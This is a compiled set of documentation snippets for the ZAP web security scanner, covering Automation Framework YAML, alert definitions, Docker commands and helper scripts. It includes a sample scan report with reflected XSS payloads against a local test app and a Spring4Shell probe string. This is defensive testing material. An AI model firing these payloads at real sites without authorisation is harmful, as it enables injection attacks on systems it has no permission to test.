        onFail: 'info'                       # String [warn, error, info]: Change this to 'warn' or 'error' for the test to take effect

----------------------------------------

TITLE: Configuring Automatic Authentication Handling in ZAP Automation Framework
DESCRIPTION: This YAML configuration demonstrates how to set up automatic authentication handling in ZAP's Automation Framework. It specifies the context, authentication method, session management, and user credentials for a target application.

LANGUAGE: yaml
CODE:
env:
  contexts:
  - name: "target"
    urls:
    - https://example.com
    includePaths: []
    excludePaths: []
    authentication:
      method: "browser"
      parameters: 
        loginPageUrl: "https://example.com/login"
      verification:
        method: "autodetect"
    sessionManagement:
      method: "autodetect"
    users:
    - name: "test@example.com"
      credentials:
        username: "test@example.com"
        password: "password123"

----------------------------------------

TITLE: Configuring Replacer Rules in YAML
DESCRIPTION: YAML configuration for setting up replacer rules in ZAP's Automation Framework. The configuration allows defining rules for replacing content in requests and responses, with options for regex matching, token processing, and specific URL targeting.

LANGUAGE: yaml
CODE:
  - type: "replacer"                   # Replacer rules
    parameters:
      deleteAllRules:                  # Boolean, if true then will delete all existing replacer rules, default false
    rules:                             # A list of replacer rules
      - description:                   # String, the name of the rule
        url:                           # String, a regex which will be used to match URLs, if empty then it will match all
        matchType:                     # String, one of req_header, req_header_str, req_body_str, resp_header, resp_header_str, resp_body_str
        matchString:                   # String, will be used to identify what should be replaced
        matchRegex:                    # Boolean, if set then the matchString will be treated as a regex, default false
        replacementString:             # String, the new string that will replace the specified selection
        tokenProcessing:               # Boolean, when enabled the replacementString may contain a single token 
        initiators:                    # A list of integers representing the initiators (see the help)

----------------------------------------

TITLE: Configuring Alert Filter Job in YAML
DESCRIPTION: YAML configuration for the alertFilter job that defines how to modify alert risk levels and create alert filters. The configuration supports global and context-specific filters with options for regex matching on various alert fields.

LANGUAGE: yaml
CODE:
  - type: alertFilter                  # Used to change the risk levels of alerts
    parameters:
      deleteGlobalAlerts: true         # Boolean, if true then will delete all existing global alerts, default false
    alertFilters:                      # A list of alertFilters to be applied
      - ruleId:                        # Int: Mandatory, the scan rule ID or the alert reference
        newRisk:                       # String: Mandatory new risk level, one of 'False Positive', 'Info', 'Low', 'Medium', 'High'
        context:                       # String: Optional context name, if empty then a global alert filter will be created
        url:                           # String: Optional string to match against the alert, supports environment vars
        urlRegex:                      # Boolean: Optional, if true then the url is a regex
        parameter:                     # String: Optional string to match against the alert parameter field
        parameterRegex:                # Boolean: Optional, if true then the parameter is a regex, supports environment vars
        attack:                        # String: Optional string to match against the alert attack field
        attackRegex:                   # Boolean: Optional, if true then the attack is a regex
        evidence:                      # String: Optional string to match against the alert evidence field
        evidenceRegex:                 # Boolean: Optional, if true then the evidence is a regex

----------------------------------------

TITLE: Implementing Authentication Detection in ZAP (Java)
DESCRIPTION: This code snippet implements the authentication detection scan rule in ZAP. It identifies authentication requests and can automatically update the authentication method for contexts set to 'Auto-Detect'.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/authhelper/src/main/java/org/zaproxy/addon/authhelper/AuthenticationDetectionScanRule.java

----------------------------------------

TITLE: Detecting Insecure HTTP to HTTPS Form Transitions in Java
DESCRIPTION: This code snippet is part of a passive scan rule in ZAP that detects insecure transitions from HTTP to HTTPS in form posts. It analyzes HTTP responses for HTTPS form action attributes, which could be vulnerable to man-in-the-middle attacks.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/InsecureFormLoadScanRule.java

----------------------------------------

TITLE: Defining Script Job in YAML for ZAP Automation Framework
DESCRIPTION: This YAML snippet shows the structure for defining a script job in the ZAP Automation Framework. It includes various parameters such as action, type, engine, name, source, inline, and target. These parameters control how scripts are added, removed, run, enabled, or disabled within ZAP.

LANGUAGE: yaml
CODE:
  - type: script
    parameters:
      action:                    # String: The executed action - available actions: add, remove, run, enable, disable
      type:                      # String: The type of the script
      engine:                    # String: The script engine to use - can be used to override the default engine for the file extension
      name:                      # String: The name of the script, defaults to the file name
      source:                    # String: The full or relative file path, must be readable
      inline:                    # String: The full script (may be multi-line) - supply this or 'file' not both
      target:                    # String: The URL to be invoked for "targeted" script type


----------------------------------------

TITLE: MongoDB NoSQL Injection Scanner in Java
DESCRIPTION: Scans for MongoDB-specific NoSQL injection flaws using boolean, error-based and authentication bypass tests. Includes special handling for JSON parameters.

LANGUAGE: Java
CODE:
MongoDbInjectionScanRule.java

----------------------------------------

TITLE: Implementing X-Powered-By Header Detection in Java for ZAP
DESCRIPTION: This code snippet is part of a ZAP extension that scans for X-Powered-By headers in HTTP responses. It defines a passive scan rule that analyzes responses for information leakage through these headers.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/XPoweredByHeaderInfoLeakScanRule.java

----------------------------------------

TITLE: Scanning Host OS App from ZAP Docker Container
DESCRIPTION: Command to scan an application running on the host OS from within a ZAP Docker container using a dynamically obtained IP address.

LANGUAGE: bash
CODE:
docker run -t zaproxy/zap-weekly zap-baseline.py -t http://$(ip -f inet -o addr show docker0 | awk '{print $4}' | cut -d '/' -f 1):10080

----------------------------------------

TITLE: Implementing JWT Session Management Script for OWASP Juice Shop in ZAP
DESCRIPTION: Session management script that handles JWT token authentication for OWASP Juice Shop application. The script extracts authentication tokens from responses, manages token lifecycle, and injects tokens into subsequent requests via Authorization header and cookies.

LANGUAGE: javascript
CODE:
/*
 * Session Management script for OWASP Juice Shop
 * 
 * For Authentication select:
 * 		Authentication method:		JSON-based authentication
 * 		Login FORM target URL:		http://localhost:3000/rest/user/login
 * 		URL to GET Login Page:		http://localhost:3000/
 * 		Login Request POST data:	{"email":"test@test.com","password":"test1"}
 * 		Username Parameter:			email
 * 		Password Parameter:			password
 * 		Logged out regex:			\Q{"user":{}}\E
 * 
 * Obviously update with any local changes as necessary.
 */

var COOKIE_TYPE   = org.parosproxy.paros.network.HtmlParameter.Type.cookie;
var HtmlParameter = Java.type('org.parosproxy.paros.network.HtmlParameter')
var ScriptVars = Java.type('org.zaproxy.zap.extension.script.ScriptVars');

function extractWebSession(sessionWrapper) {
	// parse the authentication response
	var json = JSON.parse(sessionWrapper.getHttpMessage().getResponseBody().toString());
	var token = json.authentication.token;
	// save the authentication token
	sessionWrapper.getSession().setValue("token", token);
	ScriptVars.setGlobalVar("juiceshop.token", token);
}
    	
function clearWebSessionIdentifiers(sessionWrapper) {
	var headers = sessionWrapper.getHttpMessage().getRequestHeader();
	headers.setHeader("Authorization", null);
	ScriptVars.setGlobalVar("juiceshop.token", null);
}
    	
function processMessageToMatchSession(sessionWrapper) {
	var token = sessionWrapper.getSession().getValue("token");
	if (token === null) {
		print('JS mgmt script: no token');
		return;
	}
	var cookie = new HtmlParameter(COOKIE_TYPE, "token", token);
	// add the saved authentication token as an Authentication header and a cookie
	var msg = sessionWrapper.getHttpMessage();
	msg.getRequestHeader().setHeader("Authorization", "Bearer " + token);
	var cookies = msg.getRequestHeader().getCookieParams();
	cookies.add(cookie);
	msg.getRequestHeader().setCookieParams(cookies);
}

function getRequiredParamsNames() {
	return []; 
}

function getOptionalParamsNames() {
	return [];
}

----------------------------------------

TITLE: Implementing Session Detection Scan Rule in Java for ZAP
DESCRIPTION: This code snippet is part of the SessionDetectionScanRule class in ZAP, which scans responses for session management tokens. It is located in the org.zaproxy.addon.authhelper package and is responsible for detecting and configuring automatic session management in ZAP contexts.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/authhelper/src/main/java/org/zaproxy/addon/authhelper/SessionDetectionScanRule.java

----------------------------------------

TITLE: Configuring SOAP WSDL Import Job in ZAP Automation Framework
DESCRIPTION: YAML configuration for importing SOAP WSDL definitions in ZAP automation framework. Supports importing WSDL files either from a local file path or URL. Uses the 'soap' job type with parameters for specifying the WSDL source.

LANGUAGE: yaml
CODE:
  - type: soap                         # SOAP WSDL import
    parameters:
      wsdlFile:                        # String: Local file path of the WSDL, default: null, no definition will be imported
      wsdlUrl:                         # String: URL pointing to the WSDL, default: null, no definition will be imported

----------------------------------------

TITLE: Configuring Sequence Active Scan Job in ZAP Automation Framework
DESCRIPTION: YAML configuration for running active scans on sequences. Includes options for targeting specific sequences, context settings, authentication, scan policies, and test criteria.

LANGUAGE: yaml
CODE:
  - type: sequence-activeScan                  # Active scans one or all sequences.
    parameters:
      sequence:                                # String: The name of the sequence, or empty to active scan all sequences.
      context:                                 # String: Context to use when active scanning, default: first context.
      user:                                    # String: An optional user to use for authentication, must be defined in the env.
      policy:                                  # String: Name of the scan policy to be used, default: Sequence.
    policyDefinition:                          # The policy definition - only used if the 'policy' is not set
      defaultStrength:                         # String: The default Attack Strength for all rules, one of Low, Medium, High, Insane (not recommended), default: Medium
      defaultThreshold:                        # String: The default Alert Threshold for all rules, one of Off, Low, Medium, High, default: Medium
      rules:                                   # A list of one or more active scan rules and associated settings which override the defaults
      - id:                                    # Int: The rule id as per https://www.zaproxy.org/docs/alerts/
        name:                                  # Comment: The name of the rule for documentation purposes - this is not required or actually used
        strength:                              # String: The Attack Strength for this rule, one of Low, Medium, High, Insane, default: Medium
        threshold:                             # String: The Alert Threshold for this rule, one of Off, Low, Medium, High, default: Medium
    tests:
      - name: 'test one'                       # Name of the test, optional
        type: alert                            # Specifies that the test is of type 'alert'
        action: passIfPresent/passIfAbsent     # String: The condition (presence/absence) of the alert, default: passIfAbsent
        scanRuleId:                            # Integer: The id of the scanRule which generates the alert, mandatory
        alertName:                             # String: The name of the alert generated, optional
        url: http://www.example.com/path       # String: The url of the request corresponding to the alert generated, optional
        method:                                # String: The method of the request corresponding to the alert generated, optional
        attack:                                # String: The actual attack which generated the alert, optional
        param:                                 # String: The parameter which was modified to generate the alert, optional
        evidence:                              # String: The evidence corresponding to the alert generated, optional
        confidence:                            # String: The confidence of the alert, one of 'False Positive', 'Low', 'Medium', 'High', 'Confirmed', optional
        risk:                                  # String: The risk of the alert, one of 'Informational', 'Low', 'Medium', 'High', optional
        otherInfo:                             # String: Addional information corresponding to the alert, optional
        onFail: 'info'                         # String: One of 'warn', 'error', 'info', mandatory

----------------------------------------

TITLE: Defining ZAP Authentication Alerts in YAML
DESCRIPTION: YAML configuration defining two security alerts (10105-1 and 10105-2) related to authentication vulnerabilities in ZAP's passive scanner. Links to the Java implementation file that handles the scanning logic.

LANGUAGE: yaml
CODE:
title: "Weak Authentication Method"
alertid: 10105
alertindex: 1010500
alerttype: "Passive"
status: release
type: alertset
alerts:
   10105-1:
      alertid: 10105-1
      name: "Authentication Credentials Captured"
   10105-2:
      alertid: 10105-2
      name: "Weak Authentication Method"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/InsecureAuthenticationScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/InsecureAuthenticationScanRule.java"

----------------------------------------

TITLE: YAML Front Matter Configuration
DESCRIPTION: Front matter configuration block defining metadata for the documentation page including the add-on ID and version.

LANGUAGE: yaml
CODE:
# This page was generated from the add-on.
title: AJAX Spider
type: userguide
weight: 1
cascade:
  addon:
    id: spiderAjax
    version: 23.22.0

----------------------------------------

TITLE: Referencing SQL Injection Scan Rule Implementation in Java
DESCRIPTION: This code snippet shows the location of the Java implementation for the SQL Injection scan rule in the ZAP project. It is part of the sqliplugin extension.

LANGUAGE: Java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/sqliplugin/src/main/java/org/zaproxy/zap/extension/sqliplugin/SQLInjectionScanRule.java

----------------------------------------

TITLE: Detecting Credit Card Numbers in HTTP Responses - JavaScript
DESCRIPTION: A passive security scanning script that searches for credit card number patterns in HTTP response bodies. The script identifies potential PCI DSS compliance violations and information disclosure risks. Risk level is marked as High with CWE-311 classification.

LANGUAGE: markdown
CODE:
Risk: High\nSolution: Encrypt credit card numbers during transmission, use tokenization, and adhere to PCI DSS standards for secure handling and storage.\nCWE: 311\nWASC: 13

----------------------------------------

TITLE: Pulling ZAP Docker Images
DESCRIPTION: Commands to pull different versions of ZAP Docker images from both GitHub Container Registry and Docker Hub.

LANGUAGE: bash
CODE:
docker pull ghcr.io/zaproxy/zaproxy:stable
docker pull zaproxy/zap-stable

docker pull ghcr.io/zaproxy/zaproxy:weekly
docker pull zaproxy/zap-weekly

docker pull ghcr.io/zaproxy/zaproxy:nightly
docker pull zaproxy/zap-nightly

docker pull ghcr.io/zaproxy/zaproxy:bare
docker pull zaproxy/zap-bare

----------------------------------------

TITLE: Configuring Authentication Auto-Detection in ZAP Automation Framework
DESCRIPTION: This YAML snippet demonstrates how to set up authentication auto-detection in a ZAP Automation Framework plan. It includes context configuration, authentication settings, session management, and test requests.

LANGUAGE: yaml
CODE:
---
env:
  contexts:
  - name: "simple-json"
    urls:
    - "http://localhost:9091/auth/simple-json"
    includePaths:
    - "http://localhost:9091/auth/simple-json.*"
    excludePaths: []
    authentication:
      method: "browser"
      parameters:
        loginPageUrl: "http://localhost:9091/auth/simple-json/"
        loginPageWait: 2
        browserId: "firefox-headless"
      verification:
        method: "poll"
    sessionManagement:
      method: "autodetect"
      parameters: {}
    technology:
      exclude: []
    users:
    - name: "test"
      credentials:
        username: "test@test.com"
        password: "password123"
  parameters:
    failOnError: true
    failOnWarning: false
    progressToStdout: true
  vars: {}
jobs:
- parameters:
    maxAlertsPerRule: 0
    scanOnlyInScope: true
    maxBodySizeInBytesToScan: 0
    enableTags: false
    disableAllRules: true
  rules:
  - id: 10111
    name: "Authentication Request Identified"
    threshold: "medium"
  - id: 10112
    name: "Session Management Response Identified"
    threshold: "medium"
  - id: 10113
    name: "Verification Request Identified"
    threshold: "medium"
  name: "passiveScan-config"
  type: "passiveScan-config"
- parameters:
    user: "test"
  requests:
  - url: "http://localhost:9091/auth/simple-json/user"
    name: ""
    method: ""
    httpVersion: ""
    headers: []
    data: ""
  name: "requestor"
  type: "requestor"
  tests:
  - type: "stats"
    statistic: "stats.auth.success"
    site: "http://localhost:9091"
    operator: ">="
    value: 1
    onFail: "error"
  - type: "stats"
    statistic: "stats.auth.state.loggedin"
    site: "http://localhost:9091"
    operator: ">="
    value: 1
    onFail: "error"
  - type: "stats"
    statistic: "stats.auth.sessiontoken.accesstoken"
    site: "http://localhost:9091"
    operator: ">="
    value: 1
    onFail: "error"
  - type: "stats"
    statistic: "stats.auth.configure.session.header"
    operator: ">="
    value: 1
    onFail: "error"
  - type: "stats"
    statistic: "stats.auth.detect.auth.json"
    operator: ">="
    value: 1
    onFail: "error"

----------------------------------------

TITLE: Configuring ZAP Baseline Scan GitHub Action
DESCRIPTION: YAML configuration for setting up automated daily security scanning of a public web application using ZAP baseline scan action.

LANGUAGE: yaml
CODE:
on:
  schedule:
    # Runs every day At 01:00.
    - cron:  '0 1 * * *'

jobs:
  zap_scan:
    runs-on: ubuntu-latest
    name: Scan ZAP website
    steps:
      - name: ZAP Scan
        uses: zaproxy/action-baseline@v0.3.0
        with:
          target: 'https://www.zaproxy.org/'

----------------------------------------

TITLE: YAML Configuration for JSON View Add-on
DESCRIPTION: YAML frontmatter configuration block that defines metadata for the JSON View add-on documentation page, including title, type, weight and addon details

LANGUAGE: yaml
CODE:
title: JSON View
type: userguide
weight: 1
cascade:
  addon:
    id: jsonview
    version: 3.0.0

----------------------------------------

TITLE: ZAP Alert to Discord Webhook Integration
DESCRIPTION: Implements a ZAP event consumer that sends notifications to Discord when new alerts are raised. Formats alert details including name, URL, risk level, and confidence into Discord message embeds.

LANGUAGE: javascript
CODE:
var discordWebHookUrl = "<Replace with Discord Webhook URL>"

var HttpSender = Java.type("org.parosproxy.paros.network.HttpSender")
var HttpMessage = Java.type("org.parosproxy.paros.network.HttpMessage")
var HttpHeader = Java.type("org.parosproxy.paros.network.HttpHeader")
var HttpRequestHeader = Java.type("org.parosproxy.paros.network.HttpRequestHeader")
var URI = Java.type("org.apache.commons.httpclient.URI")

function consumer(event) {
    if (event.getEventType() != "alert.added") return
    print(event.getParameters().get("name"))
    var params = event.getParameters()
    alert = {
        "fields": [
            { "name": "Alert :triangular_flag_on_post:", "value": params.get("name") },
            { "name": "URL", "value": "`" + params.get("uri") + "`" },
            { "name": "Risk", "value": params.get("riskString"), "inline": true },
            { "name": "Confidence", "value": params.get("confidenceString"), "inline": true }
        ]
    }
    var body = { "content": "", "embeds": [alert] }
    body = JSON.stringify(body)

    var requestMethod = HttpRequestHeader.POST
    var msg = new HttpMessage()
    msg.setRequestHeader(new HttpRequestHeader(requestMethod, new URI(discordWebHookUrl, true), HttpHeader.HTTP11))
    msg.getRequestHeader().setHeader(HttpHeader.CONTENT_TYPE, HttpHeader.JSON_CONTENT_TYPE)
    msg.getRequestHeader().setHeader(HttpHeader.CONTENT_LENGTH, String(body.length))
    msg.setRequestBody(body)
    var sender = new HttpSender(HttpSender.MANUAL_REQUEST_INITIATOR)
    sender.sendAndReceive(msg)
    print(msg.getResponseBody().toString())
}

function install(helper) {
    org.zaproxy.zap.ZAP.getEventBus().registerConsumer(consumer, "org.zaproxy.zap.extension.alert.AlertEventPublisher")
}

function uninstall(helper) {
    org.zaproxy.zap.ZAP.getEventBus().unregisterConsumer(consumer)
}

----------------------------------------

TITLE: Implementing URL Information Disclosure Detection in Java for ZAP
DESCRIPTION: This code snippet implements a passive scan rule in ZAP to detect sensitive information disclosure in URLs. It focuses on identifying patterns like US Social Security Numbers in request URLs.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/InformationDisclosureInUrlScanRule.java

----------------------------------------

TITLE: Implementing Loosely Scoped Cookie Scan Rule in Java for OWASP ZAP
DESCRIPTION: This code snippet implements the CookieLooselyScopedScanRule class in Java for OWASP ZAP. It performs passive scanning to detect loosely scoped cookies, which may pose security risks if accessible by unintended subdomains.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/CookieLooselyScopedScanRule.java

----------------------------------------

TITLE: Code Injection Detection Rule Implementation in Java
DESCRIPTION: Implementation of code injection detection scan rule in ZAP security scanner. The code is located in CodeInjectionScanRule.java and handles detection of server-side code injection vulnerabilities.

LANGUAGE: Java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/CodeInjectionScanRule.java

----------------------------------------

TITLE: Cookie SameSite Scan Rule YAML Configuration
DESCRIPTION: YAML configuration block defining the alert properties, risk level, solution recommendations, and related security standards for cookies missing the SameSite attribute.

LANGUAGE: yaml
CODE:
title: "Cookie without SameSite Attribute"
alertid: 10054-1
alertindex: 1005401
alerttype: "Passive"
alertcount: 3
status: release
type: alert
risk: Low
solution: "Ensure that the SameSite attribute is set to either 'lax' or ideally 'strict' for all cookies."
references:
   - https://tools.ietf.org/html/draft-ietf-httpbis-cookie-same-site
other: ""
cwe: 1275
wasc: 13
alerttags: 
  - CWE-1275
  - OWASP_2017_A05
  - OWASP_2021_A01
  - WSTG-v42-SESS-02
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/CookieSameSiteScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/CookieSameSiteScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules/#id-10054

----------------------------------------

TITLE: Running ZAP with Webswing and Local Drive Mapping
DESCRIPTION: This command runs ZAP with Webswing support and maps the current directory to /zap/wrk in the container. This allows ZAP to create and access root CA certificates for HTTPS proxying.

LANGUAGE: bash
CODE:
docker run -v $(pwd):/zap/wrk/:rw -u zap -p 8080:8080 -p 8090:8090 -i ghcr.io/zaproxy/zaproxy:stable zap-webswing.sh

----------------------------------------

TITLE: Detecting Spring4Shell Vulnerability in Java Applications using ZAP
DESCRIPTION: This code snippet is part of ZAP's Spring4Shell detection rule. It uses a specific payload to test for the vulnerability and raises an alert if a 400 response is received. The rule is designed to avoid false positives by comparing with a safe payload.

LANGUAGE: java
CODE:
class.module.classLoader.DefaultAssertionStatus=nonsense

----------------------------------------

TITLE: Defining CSP Scanner Alert Configuration in YAML
DESCRIPTION: YAML configuration block defining the properties of the CSP notice scanner alert, including alert ID, risk level, solution guidance, and reference links.

LANGUAGE: yaml
CODE:
title: "CSP: Notices"
alertid: 10055-3
alertindex: 1005503
alerttype: "Passive"
alertcount: 13
status: release
type: alert
risk: Low
solution: "Ensure that your web server, application server, load balancer, etc. is properly configured to set the Content-Security-Policy header."
references:
   - https://www.w3.org/TR/CSP/
   - https://caniuse.com/#search=content+security+policy
   - https://content-security-policy.com/
   - https://github.com/HtmlUnit/htmlunit-csp
   - https://developers.google.com/web/fundamentals/security/csp#policy_applies_to_a_wide_variety_of_resources
other: "Warnings:\nThis host name is unusual, and likely meant to be a keyword that is missing the required quotes: 'none'."
cwe: 693
wasc: 15
alerttags: 
  - CWE-693
  - OWASP_2017_A06
  - OWASP_2021_A05
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ContentSecurityPolicyScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/ContentSecurityPolicyScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules/#id-10055

----------------------------------------

TITLE: Configuring requestor Job in YAML for ZAP Automation Framework
DESCRIPTION: This YAML snippet defines the configuration for a requestor job in ZAP's Automation Framework. It allows sending specific requests to targets with custom methods, headers, and body. The job can also verify expected response codes.

LANGUAGE: yaml
CODE:
  - type: requestor                    # Used to send specific requests to targets
    parameters:
      user:                            # String: An optional user to use for authenticated requests, must be defined in the env
    requests:                          # A list of requests to make
      - url:                           # String: A mandatory URL of the request to be made
        name:                          # String: Optional name for the request, for documentation only
        method:                        # String: A non-empty request method, default: GET
        httpVersion:                   # String: The HTTP version to send the request with, default: HTTP/1.1
        headers:                       # An optional list of additional headers to include in the request
            - "header1:value1"
        data:                          # String: Optional data to send in the request body, supports vars
        responseCode:                  # Int: An optional, expected response code against which the actual response code will be matched

----------------------------------------

TITLE: Defining SOAP XML Injection Alert in YAML
DESCRIPTION: YAML configuration defining a security alert for SOAP XML injection vulnerabilities, including metadata, risk level, remediation steps, and associated policy tags.

LANGUAGE: yaml
CODE:
title: "SOAP XML Injection"
alertid: 90029
alertindex: 9002900
alerttype: "Active"
alertcount: 1
status: beta
type: alert
risk: High
solution: "Use a detailed description of SOAP attributes in the WSDL file."
references:
   - https://www.nds.ruhr-uni-bochum.de/media/nds/veroeffentlichungen/2012/07/11/camera-ready.pdf
other: "Some XML injected code has been interpreted by the server."
alerttags: 
  - OWASP_2017_A01
  - OWASP_2021_A03
  - POLICY_API
  - POLICY_DEV_CICD
  - POLICY_DEV_FULL
  - POLICY_DEV_STD
  - POLICY_QA_FULL
  - POLICY_QA_STD
  - POLICY_SEQUENCE

----------------------------------------

TITLE: Demonstrating ZAPit Command Line Option in Markdown
DESCRIPTION: Markdown snippet showing the new ZAPit command line option for quick reconnaissance scanning.

LANGUAGE: markdown
CODE:
This release adds a new `-zapit` command line option to perform a quick 'reconnaissance' scan of the URL specified.

----------------------------------------

TITLE: SOAP Action Spoofing Alert Configuration in YAML
DESCRIPTION: YAML configuration for SOAP Action Spoofing security alert in ZAP. Defines alert properties including risk level, solution recommendations, and associated security policy tags.

LANGUAGE: yaml
CODE:
title: "SOAP Action Spoofing"
alertid: 90026
alertindex: 9002600
alerttype: "Active"
alertcount: 1
status: beta
type: alert
risk: High
solution: "If not required, the SOAPAction attribute should be disabled. If needed, the operation within the SOAPAction and the SOAP body should always be compared before executing any operation. Any mismatch should be regarded as an attack."
references:
   - https://www.nds.ruhr-uni-bochum.de/media/nds/veroeffentlichungen/2012/07/11/camera-ready.pdf
other: "An unintended SOAP operation was executed by the server."
alerttags: 
  - OWASP_2017_A01
  - OWASP_2021_A03
  - POLICY_API
  - POLICY_DEV_CICD
  - POLICY_DEV_FULL
  - POLICY_DEV_STD
  - POLICY_QA_FULL
  - POLICY_QA_STD
  - POLICY_SEQUENCE

----------------------------------------

TITLE: Implementing Web Server in ZAP using JavaScript
DESCRIPTION: Creates a simple HTTP echo server on port 9000 that responds to /echo path. The server echoes back request body for /echo path and returns 404 for other paths. Uses ZAP's ExtensionNetwork API.

LANGUAGE: javascript
CODE:
var address = "0.0.0.0"
var port = 9000

var HttpResponseHeader = Java.type("org.parosproxy.paros.network.HttpResponseHeader")
var extensionNetwork = control.getExtensionLoader().getExtension("ExtensionNetwork")
var server

function messageHandler(ctx, msg) {
    ctx.overridden()
    if ("/echo".equals(msg.getRequestHeader().getURI().getPath())) {
        msg.setResponseHeader(new HttpResponseHeader("HTTP/1.0 200 OK"))
        msg.setResponseBody(msg.getRequestBody().toString())
        return
    }
    msg.setResponseHeader(new HttpResponseHeader("HTTP/1.0 404 Not Found"))
    msg.setResponseBody("The page you are trying to visit does not exist :P.")
}

function install(helper) {
    server = extensionNetwork.createHttpServer(messageHandler)
    server.start(address, port)
}

function uninstall(helper) {
    server.stop()
}

----------------------------------------

TITLE: Analyzing Cookies for HttpOnly Flag in ZAP Passive Script
DESCRIPTION: This script passively analyzes cookies for the absence of the HttpOnly flag. It is part of the ZAP community scripts and helps identify potential security vulnerabilities related to cookie access via JavaScript.

LANGUAGE: JavaScript
CODE:
https://github.com/zaproxy/community-scripts/blob/main/passive/CookieHTTPOnly.js

----------------------------------------

TITLE: Example Exposed PHP Source Code
DESCRIPTION: Sample PHP code that could be exposed through the CVE-2012-1823 vulnerability. This represents a simple PHP script that would normally be processed server-side but could be exposed to clients through this vulnerability.

LANGUAGE: php
CODE:
<?php $x=0; echo '<h1>Welcome!</h1>'; ?>

----------------------------------------

TITLE: Defining Content Cacheability Alert Types in YAML
DESCRIPTION: YAML configuration defining three distinct alert types related to content cacheability in web responses. Each alert has a unique ID and name, falling under the parent alert ID 10049. This is part of ZAProxy's passive scanning ruleset.

LANGUAGE: yaml
CODE:
title: "Content Cacheability"
alertid: 10049
alertindex: 1004900
alerttype: "Passive"
status: beta
type: alertset
alerts:
   10049-1:
      alertid: 10049-1
      name: "Non-Storable Content"
   10049-2:
      alertid: 10049-2
      name: "Storable but Non-Cacheable Content"
   10049-3:
      alertid: 10049-3
      name: "Storable and Cacheable Content"

----------------------------------------

TITLE: Detecting Information in Browser Storage with Java
DESCRIPTION: This rule scans for any information stored in browser localStorage and sessionStorage. It raises informational alerts to help understand the app's behavior. Alerts are raised once per URL and storage key combination.

LANGUAGE: Java
CODE:
InformationInStorageScanRule.java

----------------------------------------

TITLE: Configuring ZAP Alerts for /WEB-INF Folder Disclosure in YAML
DESCRIPTION: This YAML configuration defines metadata for ZAP alerts related to source code and properties file disclosure in the /WEB-INF folder. It includes alert IDs, names, and a link to the corresponding Java implementation.

LANGUAGE: yaml
CODE:
title: "Source Code Disclosure - /WEB-INF Folder"
alertid: 10045
alertindex: 1004500
alerttype: "Active"
status: release
type: alertset
alerts:
   10045-1:
      alertid: 10045-1
      name: "Source Code Disclosure - /WEB-INF Folder"
   10045-2:
      alertid: 10045-2
      name: "Properties File Disclosure - /WEB-INF folder"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/SourceCodeDisclosureWebInfScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrules/SourceCodeDisclosureWebInfScanRule.java"

----------------------------------------

TITLE: JSON Security Alert Structure Example
DESCRIPTION: Demonstrates the core structure of a ZAP security scan report, including site information and detailed security alerts with risk levels, descriptions, and instances of findings.

LANGUAGE: json
CODE:
{
    "@version": "Dev Build",
    "@generated": "Fri, 4 Feb 2022 13:04:51",
    "site":[
        {
            "@name": "http://localhost:8080",
            "@host": "localhost",
            "@port": "8080",
            "@ssl": "false",
            "alerts": [
                {
                    "pluginid": "40012",
                    "alertRef": "40012",
                    "alert": "Cross Site Scripting (Reflected)",
                    "name": "Cross Site Scripting (Reflected)",
                    "riskcode": "3",
                    "confidence": "2",
                    "riskdesc": "High (Medium)",
                    "desc": "<p>Cross-site Scripting (XSS) is an attack technique that involves ...</p>",
                    "instances":[
                        {
                            "uri": "http://localhost:8080/bodgeit/search.jsp?q=%3C%2Ffont%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cfont%3E",
                            "method": "GET",
                            "param": "q",
                            "attack": "</font><scrIpt>alert(1);</scRipt><font>",
                            "evidence": "</font><scrIpt>alert(1);</scRipt><font>",
                            "otherinfo": ""
                        },
                        {
                            "uri": "http://localhost:8080/bodgeit/contact.jsp",
                            "method": "POST",
                            "param": "comments",
                            "attack": "</td><scrIpt>alert(1);</scRipt><td>",
                            "evidence": "</td><scrIpt>alert(1);</scRipt><td>",
                            "otherinfo": ""
                        }
                    ],                   
                    "count": "2", 
                    "solution": "<p>Phase: Architecture and Design</p><p>Use a vetted library or framework that does not ...</p>",
                    "otherinfo": "",
                    "reference": "<p>http://projects.webappsec.org/Cross-Site-Scripting</p><p>http://cwe.mitre.org/data/definitions/79.html</p>",
                    "cweid": "79",
                    "wascid": "8",
                    "sourceid": "36977"
                }

----------------------------------------

TITLE: JSON Security Alert Structure Example
DESCRIPTION: Demonstrates the core structure of a ZAP security scan report, including site information and detailed security alerts with risk levels, descriptions, and instances of findings.

LANGUAGE: json
CODE:
{
    "@version": "Dev Build",
    "@generated": "Fri, 4 Feb 2022 13:04:51",
    "site":[
        {
            "@name": "http://localhost:8080",
            "@host": "localhost",
            "@port": "8080",
            "@ssl": "false",
            "alerts": [
                {
                    "pluginid": "40012",
                    "alertRef": "40012",
                    "alert": "Cross Site Scripting (Reflected)",
